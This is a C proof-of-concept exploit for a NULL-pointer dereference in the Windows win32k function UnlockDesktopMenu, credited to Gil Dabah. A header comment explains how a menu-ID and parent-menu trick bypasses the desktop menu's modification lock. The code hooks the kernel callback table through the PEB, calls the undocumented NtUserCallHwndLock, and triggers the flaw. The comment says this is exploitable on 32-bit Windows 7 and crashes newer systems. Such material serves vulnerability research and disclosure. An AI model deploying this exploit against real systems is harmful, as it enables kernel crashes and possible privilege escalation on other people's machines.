//
// Gil Dabah 2019
// UnlockDesktopMenu NULL Dereference POC
// Part of the "Win32k Smash the Ref" POCs, as it's used in POC #10.
//

/*
We manage to bypass the modification-locking of a desktop menu.
UnlockDesktopMenu doesn't check submenu is non-null because they assume it can't be modified.
Fully exploitable on Win 7 32 bit and below. Crash on Windows 7 64 bit and above.

The trick is to abuse MF_BYCOMMAND behavior and set an ID for the desktop menu.
Then through a parent menu it's possible to modify this desktop menu,
as menu APIs search for the ID down the hierarchy, find our locked desktop menu,
and modify it nevertheless.

Stack trace of crash:
win32kfull!UnlockDesktopMenu+0x20
win32kfull!DestroyPendingDesktops+0xb3218
win32kfull!xxxHandleDesktopMessages+0x92
win32kfull!xxxDesktopThread+0x480
win32kbase!xxxCreateSystemThreads+0x155
win32kfull!NtUserCallNoParam+0x70
nt!KiSystemServiceCopyEnd+0x25
win32u!NtUserCallNoParam+0x14
*/

#include <windows.h>
#include <stdio.h>

#define DUMMYCLASS "classsbla"
#define SOME_MENU_ID 0x29a

HWND g_h1 = NULL;
HMENU g_hMenu1 = NULL;
HMENU g_hMenu2 = NULL;

#define ClientLoadMenu_NO 0x4c
#define GetSysMenuOffset_NO 0x6f

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

void HookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}
typedef NTSTATUS(*clm_ptr)(ULONG_PTR);
clm_ptr g_clm = NULL;

LRESULT CALLBACK clm(ULONG_PTR)
{
	typedef NTSTATUS(WINAPI *NtCallbackReturnPtr)(PVOID, ULONG, NTSTATUS);
	NtCallbackReturnPtr NtCallbackReturnFunc = (NtCallbackReturnPtr)GetProcAddress(GetModuleHandle("ntdll"), "NtCallbackReturn");

	printf("CLM entering\n");

	ULONG_PTR ret[3] = { 0 };
	ret[0] = (ULONG_PTR)g_hMenu1;

	return NtCallbackReturnFunc((PVOID)ret, sizeof(ret), 0);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = DUMMYCLASS;
	wc.lpfnWndProc = DefWindowProc;
	RegisterClass(&wc);

	// We need a fresh desktop so its own menus are still NULL...

	HDESK oldD = GetThreadDesktop(GetCurrentThreadId());
	HDESK hd = CreateDesktop("dljfd", NULL, NULL, 0, GENERIC_ALL, NULL);
	SetThreadDesktop(hd);

	g_hMenu1 = CreateMenu();
	g_hMenu2 = CreateMenu();
	AppendMenu(g_hMenu1, MF_POPUP, (UINT_PTR)g_hMenu2, (LPCSTR)"&h0");

	HookClientCallback((void**)&g_clm, (void*)clm, ClientLoadMenu_NO);

	typedef ULONG_PTR(WINAPI *NtUserCallHwndLockPtr)(HWND hWnd, SIZE_T procNumber);
	NtUserCallHwndLockPtr NtUserCallHwndLock = (NtUserCallHwndLockPtr)GetProcAddress(GetModuleHandle("win32u"), "NtUserCallHwndLock");

	g_h1 = CreateWindow(DUMMYCLASS, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	g_hMenu1 = CreateMenu();
	printf("New menu: %p, new window: %p\n", g_hMenu1, g_h1);
	AppendMenu(g_hMenu1, MF_POPUP, (UINT_PTR)g_hMenu2, (LPCSTR)"&h0");
	MENUITEMINFO mii = { 0 };
	mii.cbSize = sizeof(mii);
	mii.fMask = MIIM_ID;
	mii.wID = SOME_MENU_ID;
	SetMenuItemInfo(g_hMenu1, 0, TRUE, &mii);

	/////////////////////////////////
	// Menu manipulation for bypassing MFDESKTOP
	HMENU hParentMenu = CreateMenu();
	AppendMenu(hParentMenu, MF_POPUP, (UINT_PTR)g_hMenu1, (LPCSTR)"&h0");
	/////////////////////////////////

	NtUserCallHwndLock(g_h1, GetSysMenuOffset_NO);

	// This will cause the crash of UnlockDesktopMenu as we are adding a menuitem that doesn't have a submenu.
	// And we can do it even though g_hMenu1 (our desktopmenu) is locked for modifications.
	// And that's thanks to the ID and parent menu trick...
	InsertMenu(hParentMenu, SOME_MENU_ID, MF_BYCOMMAND, 0, "hello");

	DestroyWindow(g_h1);
	SetThreadDesktop(oldD);
	CloseDesktop(hd);

	return 0;
}
